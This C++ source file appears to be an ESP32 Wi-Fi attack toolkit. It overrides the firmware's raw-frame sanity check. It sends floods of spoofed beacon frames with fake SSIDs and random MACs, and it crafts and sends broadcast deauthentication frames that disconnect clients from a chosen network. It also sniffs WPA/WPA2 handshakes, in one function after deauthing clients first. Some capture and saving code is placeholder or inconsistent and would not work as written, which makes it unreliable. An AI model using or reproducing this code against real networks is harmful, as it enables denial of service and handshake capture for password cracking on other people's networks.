#include "WiFiTools.h"

#include <WiFi.h>

#include <vector>

#include "esp_event.h"
#include "esp_event_loop.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "nvs_flash.h"

esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void* buffer, int len, bool en_sys_seq);
esp_err_t esp_wifi_set_storage(wifi_storage_t storage);
esp_err_t esp_wifi_set_mode(wifi_mode_t mode);
esp_err_t esp_wifi_start();
esp_err_t esp_wifi_set_promiscuous(bool en);

// Overwrite the function to prevent the sanity check from returning an error allowing the raw frame to be sent
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Constructor
WiFiTools::WiFiTools() {
    // Empty constructor
}

void WiFiTools::beaconSpamSetup() {
    // Initialize esp_wifi
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
        Serial.printf("Failed to initialize esp_wifi: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi storage to RAM
    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
        Serial.printf("Failed to set WiFi storage: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi mode to STA
    err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (err != ESP_OK) {
        Serial.printf("Failed to set WiFi mode: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Start WiFi
    err = esp_wifi_start();
    if (err != ESP_OK) {
        Serial.printf("Failed to start WiFi: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi to promiscuous mode
    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Failed to set WiFi to promiscuous mode: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    Serial.println("WiFi initialized successfully");
}

void WiFiTools::nextChannel() {
    // Increment the channel index
    channelIndex = (channelIndex + 1) % 14;  // Assuming 14 channels
    if (channelIndex == 0) {
        channelIndex = 1;
    }
    // Set the WiFi channel
    esp_wifi_set_channel(channelIndex, WIFI_SECOND_CHAN_NONE);
}

void WiFiTools::generateRandomMac() {
    // Generate a random MAC address
    for (int i = 0; i < 6; i++) {
        randomMacAddr[i] = random(0, 255);
    }
}

void WiFiTools::rickRollBeaconSpam() {
    beaconSpamSetup();

    Serial.println("Starting rickRollBeaconSpam");

    // Stop current WiFi connection and transition to AP mode
    WiFi.disconnect();

    // create empty SSID
    for (int i = 0; i < 32; i++)
        emptySSID[i] = ' ';

    // set packetSize
    packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize -= 26;
    }

    // change WiFi mode to AP mode
    WiFi.mode(WIFI_AP);
    Serial.println("WiFi mode set to AP");

    // set channel
    esp_err_t err = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("Failed to set channel: %d\n", err);
        return;
    }
    Serial.println("Channel set to 1");

    delay(1000);
    for (int k = 0; k < 10; k++) {
        // loop through all SSIDs
        for (int i = 0; i < 8; i++) {
            // generate random MAC address
            generateRandomMac();

            // debug
            Serial.printf("SSID: %s\n", rickRollSSIDs[i]);
            Serial.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", randomMacAddr[0], randomMacAddr[1], randomMacAddr[2], randomMacAddr[3], randomMacAddr[4], randomMacAddr[5]);

            // set MAC address in beacon packet
            memcpy(&beaconPacket[10], randomMacAddr, 6);
            memcpy(&beaconPacket[16], randomMacAddr, 6);

            // reset SSID
            memcpy(&beaconPacket[38], emptySSID, 32);

            // get length of SSID
            uint8_t ssidLength = strlen_P(rickRollSSIDs[i]);

            // write new SSID into beacon frame
            memcpy_P(&beaconPacket[38], (const char*)pgm_read_ptr(&rickRollSSIDs[i]), ssidLength);

            // set channel for beacon frame
            beaconPacket[82] = channelIndex;
            Serial.printf("Beacon Packet Channel: %d\n", channelIndex);

            // print the beacon frame
            for (int j = 0; j < packetSize; j++) {
                Serial.printf("%02X ", beaconPacket[j]);
            }

            for (int j = 0; j < 100; j++) {
                // send beacon frame
                err = esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
                if (err != ESP_OK) {
                    Serial.printf("Failed to send beacon: %d\n", err);
                } else {
                    Serial.println("Beacon sent successfully");
                }
                delay(1);
            }

            delay(10);

            nextChannel();
        }
    }

    Serial.println("Finished rickRollBeaconSpam");

    // Stop WiFi
    WiFi.mode(WIFI_OFF);
    Serial.println("WiFi stopped");
}

void WiFiTools::scanWiFiNetworks() {
    // Clear the foundWiFiNetworks vector
    foundWiFiNetworks.clear();

    // Get a list of available networks displaying their SSID, MAC address and channel
    int numNetworks = WiFi.scanNetworks();
    Serial.printf("Found %d networks\n", numNetworks);

    for (int i = 0; i < numNetworks; i++) {
        Serial.printf("Network %d: %s, MAC: %s, Channel: %d\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
        wifi_ap_record_t ap;
        ap.rssi = WiFi.RSSI(i);
        ap.authmode = WiFi.encryptionType(i);
        ap.primary = WiFi.channel(i);
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        memcpy(ap.ssid, WiFi.SSID(i).c_str(), 32);
        foundWiFiNetworks.push_back(ap);
    }
}

std::vector<wifi_ap_record_t> WiFiTools::getAvailableNetworks() {
    if (foundWiFiNetworks.size() == 0) {
        scanWiFiNetworks();
    }
    return foundWiFiNetworks;
}

void WiFiTools::clearFoundWiFiNetworks() {
    foundWiFiNetworks.clear();
}

void WiFiTools::sendDeauthPacket(uint8_t* apMac, uint8_t* stMac, uint8_t channel, uint8_t reasonCode) {
    // build the deauth packet
    uint16_t deauthPacketSize = sizeof(deauthPacket);
    uint8_t deauthPacketToTransmit[deauthPacketSize];
    memcpy(deauthPacketToTransmit, deauthPacket, deauthPacketSize);

    memcpy(&deauthPacketToTransmit[4], stMac, 6);
    memcpy(&deauthPacketToTransmit[10], apMac, 6);
    memcpy(&deauthPacketToTransmit[16], apMac, 6);
    deauthPacketToTransmit[24] = reasonCode;

    deauthPacketToTransmit[0] = 0xC0;

    // Set channel
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("Failed to set channel: %d\n", err);
        return;
    }

    // Ensure WiFi interface is set to AP mode
    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        Serial.printf("Failed to set WiFi mode: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi to promiscuous mode
    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Failed to set WiFi to promiscuous mode: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Send the deauth packet
    err = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketToTransmit, deauthPacketSize, false);
    if (err != ESP_OK) {
        Serial.printf("Failed to send deauth: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
    } else {
        Serial.println("Deauth sent successfully");
    }
}

void WiFiTools::deauthNetwork(uint8_t* networkSSID = NULL, uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = -1, uint8_t* targetMacAddr = NULL, int numPackets = 1, int delayMs = 100, uint8_t reasonCode = 2) {
    uint8_t apMac[6];
    uint8_t stMac[6];
    uint8_t targetMac[6];

    // Check if networkSSID, networkBSSID, and channel are provided
    if (networkSSID != NULL && networkBSSID != NULL && channel != NULL) {
        // Set the variables for the deauth packet
        memcpy(apMac, networkBSSID, 6);

        // Set the target MAC address
        if (targetMacAddr != NULL) {
            memcpy(targetMac, targetMacAddr, 6);
        } else {
            // Set the target MAC address to broadcast
            memset(targetMac, 0xFF, 6);
        }
    } else if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
        // Set the variables for the deauth packet
        memcpy(apMac, foundWiFiNetworks[availableNetworkIndex].bssid, 6);

        // Set the target MAC address
        if (targetMacAddr != NULL) {
            memcpy(targetMac, targetMacAddr, 6);
        } else {
            // Set the target MAC address to broadcast
            memset(targetMac, 0xFF, 6);
        }

        // Set the channel
        channel = foundWiFiNetworks[availableNetworkIndex].primary;
    } else {
        Serial.println("Error: Network information not provided");
        return;
    }

    for (int i = 0; i < numPackets; i++) {
        // Send the deauth packet
        sendDeauthPacket(apMac, targetMac, channel, reasonCode);
        delay(delayMs);
    }

    Serial.println("Deauth attack complete");

    // Stop WiFi
    WiFi.mode(WIFI_OFF);
    Serial.println("WiFi stopped");
}

void WiFiTools::saveHandshakeData(const std::vector<uint8_t*>& capturedPackets) {
    // Temp placeholder for saving handshake data
    Serial.println("Saving handshake data");
}

void WiFiTools::saveClientData(const std::vector<uint8_t*>& detectedClients) {
    // Temp placeholder for saving client data
    Serial.println("Saving client data");
}

bool WiFiTools::isHandshakePacket(const uint8_t* data, const uint8_t* networkBSSID) {
    // Check if the packet contains an EAPOL (Extensible Authentication Protocol Over LAN) frame
    // EAPOL frames are part of WPA/WPA2 handshake packets.
    const uint16_t eapolFrameType = 0x888E;  // Ethernet type for EAPOL
    const uint8_t eapolHeaderOffset = 12;    // Offset to Ethernet type field in a packet

    // Compare the Ethernet type field in the packet with EAPOL frame type
    if (data[eapolHeaderOffset] == (eapolFrameType >> 8) && data[eapolHeaderOffset + 1] == (eapolFrameType & 0xFF)) {
        // Ensure the BSSID matches the target network
        return memcmp(data + 10, networkBSSID, 6) == 0;  // BSSID is usually found starting at byte 10
    }

    return false;
}

bool WiFiTools::isClientPacket(const uint8_t* data, const uint8_t* networkBSSID) {
    // Check if the packet is a data frame and if the BSSID matches the target network
    // Frame control field is the first two bytes (offset 0)
    uint8_t frameControl = data[0];
    const uint8_t dataFrameType = 0x08;  // Type/Subtype field for data frames

    // Check for data frame and direction (to DS or from DS)
    if ((frameControl & 0x0C) == dataFrameType) {
        // Extract BSSID (position depends on direction of data frame)
        uint8_t* bssid = nullptr;
        if ((frameControl & 0x03) == 0x01) {  // To DS
            bssid = const_cast<uint8_t*>(data + 4);
        } else if ((frameControl & 0x03) == 0x02) {  // From DS
            bssid = const_cast<uint8_t*>(data + 10);
        }

        if (bssid && memcmp(bssid, networkBSSID, 6) == 0) {
            return true;  // Packet belongs to the specified network
        }
    }

    return false;
}

uint8_t* WiFiTools::extractClientMac(const uint8_t* data) {
    // Extract the source or destination MAC address from a data frame
    // Offset depends on the frame's direction
    uint8_t* clientMac = new uint8_t[6];
    uint8_t frameControl = data[0];

    if ((frameControl & 0x03) == 0x01) {         // To DS
        memcpy(clientMac, data + 10, 6);         // Source MAC address
    } else if ((frameControl & 0x03) == 0x02) {  // From DS
        memcpy(clientMac, data + 4, 6);          // Destination MAC address
    }

    return clientMac;
}

void WiFiTools::promiscuousPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Cast the buffer to the Wi-Fi packet structure
    wifi_promiscuous_pkt_t* packet = reinterpret_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* data = packet->payload;

    // Ensure a global or singleton instance of WiFiTools is available
    extern WiFiTools* globalWiFiToolsInstance;  // Declare global instance
    if (!globalWiFiToolsInstance) {
        return;  // Safety check to ensure instance is available
    }

    WiFiTools* instance = globalWiFiToolsInstance;

    // Process packets for handshake capture or client detection
    if (instance->isHandshakePacket(data, instance->targetBSSID)) {
        // Capture handshake packets (allocate memory and copy the packet data)
        uint8_t* packetCopy = new uint8_t[packet->rx_ctrl.sig_len];
        memcpy(packetCopy, data, packet->rx_ctrl.sig_len);
        instance->capturedPackets.push_back(packetCopy);
    }

    if (instance->isClientPacket(data, instance->targetBSSID)) {
        // Detect client packets (extract client MAC address and copy it)
        uint8_t* clientMac = instance->extractClientMac(data);
        instance->detectedClients.push_back(clientMac);
    }
}

void WiFiTools::processWiFiData(uint8_t* networkBSSID, uint8_t channel, int captureTime, bool captureHandshake, bool detectClients) {
    // Set the Wi-Fi channel and enable promiscuous mode
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);

    uint32_t startTime = millis();
    std::vector<uint8_t*> capturedPackets;
    std::vector<uint8_t*> detectedClients;

    // Implement logic within a global or static packet handler
    static WiFiTools* instance = this;

    // Packet capture loop
    while (millis() - startTime < captureTime) {
        // Processing is handled in the callback
        delay(10);
    }

    // Disable promiscuous mode
    esp_wifi_set_promiscuous(false);

    // Save captured data
    if (captureHandshake) {
        saveHandshakeData(capturedPackets);
    }
    if (detectClients) {
        saveClientData(detectedClients);
    }

    // Free dynamically allocated memory
    for (auto packet : capturedPackets) {
        delete[] packet;
    }
    for (auto client : detectedClients) {
        delete[] client;
    }
}

void WiFiTools::handshakeCapture(uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = NULL, int captureTime = 10000) {
    // Check if availableNetworkIndex is provided
    if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
        // Set the attack variables
        targetChannel = foundWiFiNetworks[availableNetworkIndex].primary;
        memcpy(targetBSSID, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
    } else if (networkBSSID != NULL && channel != NULL) {
        // Set the attack variables
        targetChannel = channel;
        memcpy(targetBSSID, networkBSSID, 6);
    } else {
        Serial.println("Error: Network information not provided");
        return;
    }

    // DEBUG
    Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.printf("Target Channel: %d\n", targetChannel);
    Serial.printf("Capture Time: %d\n", captureTime);
    Serial.println("Starting handshake capture");

    // Call the processWiFiData function to capture handshake packets
    processWiFiData(targetBSSID, targetChannel, captureTime, true, false);

    Serial.println("Handshake capture complete");
}

void WiFiTools::activeHandshakeCapture(uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = NULL, int captureTime = 10000) {
    // Check if availableNetworkIndex is provided
    if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
        // Set the attack variables
        targetChannel = foundWiFiNetworks[availableNetworkIndex].primary;
        memcpy(targetBSSID, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
    } else if (networkBSSID != NULL && channel != NULL) {
        // Set the attack variables
        targetChannel = channel;
        memcpy(targetBSSID, networkBSSID, 6);
    } else {
        Serial.println("Error: Network information not provided");
        return;
    }

    // DEBUG
    Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.printf("Target Channel: %d\n", targetChannel);
    Serial.printf("Capture Time: %d\n", captureTime);
    Serial.println("Starting active handshake capture");
    Serial.println("Deauthenticating clients prior to capturing handshake packets");

    // Call the deauthNetwork function to deauthenticate clients prior to capturing handshake packets
    deauthNetwork(NULL, targetBSSID, targetChannel, NULL, NULL, 500, 10, 2);

    Serial.println("Deauthentication complete");
    Serial.println("Starting handshake capture");
    // Call the processWiFiData function to capture handshake packets
    processWiFiData(targetBSSID, targetChannel, captureTime, true, false);

    Serial.println("Handshake capture complete");
}